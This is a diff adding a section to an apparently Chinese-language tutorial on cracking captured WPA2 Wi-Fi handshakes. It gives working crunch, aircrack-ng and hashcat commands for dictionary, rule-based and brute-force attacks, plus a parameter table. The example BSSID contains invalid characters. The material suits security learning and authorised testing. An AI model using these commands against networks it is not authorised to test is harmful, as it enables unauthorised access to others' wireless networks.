@@ -138,3 +138,71 @@ ls -lh lab_capture*
 aircrack-ng lab_capture-01.cap
 
 ```
+
+### 使用字典验证
+
+- kali自带字典
+
+`/usr/share/wordlists/rockyou.txt.gz`
+
+- 使用crunch生成自定义字典
+
+生成长度8位，包含数字和小写字母的所有组合
+
+```
+$crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o custom-wordlist.txt
+```
+
+使用crunch管道输出到aircrack-ng（节省磁盘空间）
+
+```
+$crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b bc:8o:ba:f8:qa:bd wpa2-crack-01.cap
+```
+
+### 使用hashcat加速
+
+与aircrack-ng使用CPU不同，hashcat可以利用GPU的并行计算能力，
+实现比CPU高数十甚至数百倍的破解速度
+
+将捕获文件转换为Hashcat格式
+
+```
+# 方法1：使用aircrack-ng内置转换
+aircrack-ng wpa2-crack-01.cap -J wpa2-hashcat
+ 
+# 方法2：使用hccapx工具
+cap2hccapx wpa2-crack-01.cap wpa2-hccapx.hccapx
+ 
+# 方法3：使用hcxpcapngtool (推荐，更新)
+hcxpcapngtool -o wpa2-hashcat.hc22000 wpa2-crack-01.cap
+```
+
+使用Hashcat破解WPA2
+
+```
+# 基本字典攻击
+hashcat -m 22000 -a 0 wpa2-hashcat.hc22000 /usr/share/wordlists/rockyou.txt
+ 
+# 字典 + 规则攻击（自动变换字典中的单词）
+hashcat -m 22000 -a 0 wpa2-hashcat.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+ 
+# 暴力破解（8位纯数字）
+hashcat -m 22000 -a 3 wpa2-hashcat.hc22000 ?d?d?d?d?d?d?d?d
+```
+
+
+参数说明
+
+
+| 参数 | 含义 |
+| :--- | :--- |
+| `-m 22000` | Hash模式（WPA2 EAPOL-PMK） |
+| `-a 0` | 攻击模式（0=字典，3=暴力） |
+| `-w 3` | 工作负载配置（越高越快，但影响系统响应） |
+| `--force` | 忽略警告 |
+| `--show` | 显示已破解的密码 |
+
+
+# 参考
+
+[wifi-encryption-and-cracking-guide](https://blog.changwei.me/articles/cybersecurity/wifi-encryption-and-cracking-guide)
